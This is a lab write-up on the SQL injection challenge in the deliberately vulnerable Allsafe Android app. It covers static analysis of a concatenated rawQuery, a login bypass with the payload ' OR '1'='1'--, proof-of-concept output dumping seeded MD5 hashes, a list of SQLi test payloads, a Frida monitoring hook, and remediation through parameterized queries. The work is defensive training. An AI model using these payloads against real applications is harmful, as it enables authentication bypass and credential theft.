# SQL Injection — Authentication Bypass

| | |
|---|---|
| **App** | Allsafe v1.0 (infosecadventures.allsafe) |
| **Week** | 04 |
| **Category** | Injection |
| **MASVS** | MASVS-CODE-4 |
| **MASTG** | MASTG-TEST-0001 |
| **Severity** | 🔴 Critical — full authentication bypass + credential exposure |
| **Android / device** | Android 11 (Waydroid), unrooted |
| **Tool versions** | jadx-gui 1.5.x, adb (Android SDK Platform Tools) |

---

## 1. Summary

The Allsafe SQL Injection challenge exposes a login endpoint backed by a SQLite database that constructs queries via raw string concatenation without sanitization or parameterization. An unauthenticated attacker can bypass authentication entirely with a single-line payload and retrieve all credentials stored in the database — including MD5-hashed passwords for every registered account.

---

## 2. Background

SQL Injection (SQLi) is a code injection technique where attacker-controlled input is interpreted as SQL syntax rather than data. It has topped the OWASP Top 10 since its inception and remains one of the most exploited vulnerability classes in production applications.

On Android, local databases are typically SQLite. Apps interact via `android.database.sqlite.SQLiteDatabase`, which offers both safe (parameterized) and unsafe (raw string) query methods. When developers use `rawQuery()` with concatenated user input, the same injection conditions that exist in web backends apply to mobile apps.

The impact on mobile is often underappreciated — SQLite databases can hold session tokens, PII, credentials, and health data. A single unparameterized query is enough to expose all of it.

---

## 3. Recon

The challenge presents a **LOGIN PORTAL** (`fragment_sql_injection`) with two fields: `username` and `password`. No network traffic is involved — all authentication logic is handled locally against an in-memory SQLite database populated at runtime.

**Relevant component:** `infosecadventures.allsafe.challenges.SQLInjection` (Fragment)

No exported components or special permissions are required — the attack surface is entirely the UI input fields, making this a zero-privilege, zero-network attack.

**Database schema (inferred from source):**

```sql
CREATE TABLE user (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT   -- stored as unsalted MD5 hash
);
```

**Seeded accounts:**

| Username | MD5 Hash |
|---|---|
| admin | `21232f297a57a5a743894a0e4a801fc3` |
| elliot.alderson | `3484cef7f6ff172c2cd278d3b51f3e66` |
| angela.moss | `0af58729667eace3883a992ef2b8ce29` |
| gideon.goddard | `65dc3431f8c5e3f0e249c5b1c6e3534d` |
| tyrell.wellick | `6d2e1c6dd505a108cc7e19a46aa30a8a` |
| darlene.alderson | `d510b80eb22f8eb684f1a19681eb7bcf` |

---

## 4. Static Analysis

**Decompile the APK:**

```bash
jadx-gui allsafe.apk
# Navigate: infosecadventures → allsafe → challenges → SQLInjection
```

**Vulnerable class:** `SQLInjection.kt` → decompiled as `SQLInjection.java`

### 4.1 The Sink — Unsanitized `rawQuery()`

```java
// onCreateView$lambda$0 — login button click handler
// ❌ VULNERABLE: direct string concatenation, null parameter array
Cursor cursor = $db.rawQuery(
    "select * from user where username = '" 
    + ((Object) $username.getText())                              // SOURCE: raw input
    + "' and password = '" 
    + this$0.md5(String.valueOf($password.getText()))             // MD5'd but irrelevant
    + "'",
    null                                                          // no parameterization
);
```

**Why this is vulnerable:** The username value is retrieved via `.getText()` and concatenated directly into the SQL string. SQLite receives and parses the final string as a complete SQL statement, interpreting any SQL syntax within the user's input as commands — not data.

### 4.2 The Credential Leak

```java
// All rows returned by the query are exposed verbatim to the UI
if (cursor.getCount() > 0) {
    cursor.moveToFirst();
    do {
        String user = cursor.getString(1);   // username column
        String pass = cursor.getString(2);   // password column (MD5 hash)
        data.append("User: " + user + " \nPass: " + pass + "\n");
    } while (cursor.moveToNext());
}
Toast.makeText(this$0.getContext(), data, 1).show();
```

**Why this matters:** The app does not scope its result — it returns and displays every column from every matching row. A bypass that returns all rows dumps the full user table to screen.

### 4.3 Weak Hashing — MD5 with No Salt

```java
private final String md5(String input) throws NoSuchAlgorithmException {
    MessageDigest md = MessageDigest.getInstance("MD5");
    byte[] bytes = input.getBytes(Charsets.UTF_8);
    return StringsKt.padStart(
        new BigInteger(1, md.digest(bytes)).toString(16), 32, '0'
    );
}
```

MD5 is cryptographically broken for password storage. With no salt, identical passwords produce identical hashes — making the entire table vulnerable to rainbow table and lookup attacks. The hash `21232f297a57a5a743894a0e4a801fc3` resolves to `admin` in any public database instantly.

---

## 5. Dynamic Analysis

**Connect ADB to Waydroid:**

```bash
waydroid status
# confirm: Session: RUNNING, Container: RUNNING

adb connect 192.168.240.112:5555
# connected to 192.168.240.112:5555
```

**Monitor runtime SQL activity:**

```bash
adb logcat | grep -i "sql\|query\|database\|error" --color
```

The logcat output confirms the app operates entirely in-process with no network calls. The injection succeeds silently with no error thrown — SQLite executes the manipulated query successfully, which is itself a confirmation of the vulnerability.

---

## 6. Exploitation

### 6.1 Authentication Bypass

1. Launch the **Allsafe** app in Waydroid and navigate to **Challenge 04 — SQL Injection**.
2. In the **Username** field, enter:
   ```
   ' OR '1'='1'--
   ```
3. In the **Password** field, enter any value (e.g., `test`).
4. Tap **[LOGIN]**.
5. Observe: a Toast notification appears with the credentials of **all users** in the database.

### 6.2 Why the Payload Works

The final SQL query evaluated by SQLite becomes:

```sql
SELECT * FROM user
WHERE username = '' OR '1'='1'--' AND password = '<md5>'
```

- `' OR '1'='1'` closes the username string and appends a tautology (always true)
- `--` comments out the remainder of the query including the password check
- SQLite returns all rows → the app displays all usernames and password hashes

### 6.3 Proof of Concept

```
Payload (Username field):  ' OR '1'='1'--
Payload (Password field):  <anything>

Result (Toast output):
  User: admin
  Pass: 21232f297a57a5a743894a0e4a801fc3

  User: elliot.alderson
  Pass: 3484cef7f6ff172c2cd278d3b51f3e66

  [... all 6 accounts ...]
```

**Payload reference:** [PayloadsAllTheThings — SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

📸 Evidence: `evidence/` ← attach your screenshot of the Toast with credentials

---

## 7. Impact

In a production Android application, this vulnerability class would have the following consequences:

**Authentication bypass:** Any user — including unauthenticated actors with physical device access — can log in as any account, including admin, without knowing the password.

**Full credential dump:** All usernames and password hashes are exposed in a single request. If passwords are stored with weak hashing (MD5, SHA1, unsalted), they are trivially reversible via lookup tables.

**Lateral movement:** In an app with role-based access, bypassing authentication as an admin account grants access to all privileged functionality.

**Offline attack surface:** Unlike web SQLi which requires network access, mobile SQLite injection requires only UI access — making it exploitable by anyone who picks up the device, including in lost-device or insider-threat scenarios.

**Affected parties:** Every registered user of the application. The attack requires no special tools, no root, and no network interception.

---

## 8. Remediation

### Primary Fix — Parameterized Queries

```java
// ✅ SECURE: use positional parameters, never concatenation
Cursor cursor = $db.rawQuery(
    "SELECT * FROM user WHERE username = ? AND password = ?",
    new String[]{
        $username.getText().toString().trim(),
        this$0.md5(String.valueOf($password.getText()))
    }
);
```

SQLite's prepared statement engine treats `?` values as pure data — SQL metacharacters (`'`, `--`, `;`) within them have no syntactic effect.

### Defence in Depth

- **Replace MD5 with bcrypt / Argon2:** Android's `Security` library and third-party libs (e.g., jBCrypt) support proper password hashing with salts and work factors. MD5 is not acceptable for credential storage under any standard (NIST SP 800-63B, OWASP ASVS Level 1+).
- **Principle of least privilege on queries:** Return only the columns needed. Use `SELECT id FROM user WHERE ...` for authentication checks rather than `SELECT *`.
- **Input validation:** Enforce username character whitelisting (alphanumeric + limited symbols) at the UI layer as a secondary control — never the primary one.
- **Avoid storing credentials locally:** Where possible, delegate authentication to a remote server over TLS. Local credential stores are always higher risk.

### Verifying the Fix

```bash
# Inject the bypass payload — must return zero rows
adb shell
# Input: ' OR '1'='1'--
# Expected: Toast shows nothing / "Invalid credentials"
# Confirm: no user data exposed
```

---

## 9. Detection / Testing Notes

**Manual testing:**
- Test all authentication input fields with standard SQLi polyglots: `'`, `''`, `' OR '1'='1'--`, `' OR 1=1;--`
- Observe: unexpected login success, error messages revealing query structure, or data exposure

**Static analysis (SAST):**
- Search decompiled source for `rawQuery(`, `execSQL(`, `compileStatement(` with adjacent string concatenation (`+`)
- MobSF flags unsanitized `rawQuery` calls with high confidence
- CodeQL query: `AndroidSQLInjection` taint tracks `EditText.getText()` → `rawQuery()`

**Dynamic analysis (DAST):**
- Drozer: `app.provider.query` with injected projection/selection
- Frida hook on `android.database.sqlite.SQLiteDatabase.rawQuery` to log all queries at runtime:

```javascript
// Frida snippet — log all rawQuery calls
Java.use('android.database.sqlite.SQLiteDatabase').rawQuery.overload(
    'java.lang.String', '[Ljava.lang.String;'
).implementation = function(sql, args) {
    console.log('[SQLi Monitor] Query: ' + sql);
    return this.rawQuery(sql, args);
};
```

---

## 10. References

- **OWASP MASTG:** [MASTG-TEST-0001 — Testing for SQL Injection](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0001/)
- **OWASP MASVS:** [MASVS-CODE-4](https://mas.owasp.org/MASVS/controls/MASVS-CODE-4/)
- **OWASP Top 10 Mobile:** [M7 — Client Code Quality](https://owasp.org/www-project-mobile-top-10/)
- **PayloadsAllTheThings:** [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
- **Allsafe:** [github.com/t0thkr1s/allsafe](https://github.com/t0thkr1s/allsafe)
- **NIST SP 800-63B:** Password storage requirements (§5.1.1.2)
- **Android Docs:** [SQLiteDatabase — Parameterized Queries](https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase#rawQuery(java.lang.String,%20java.lang.String[]))
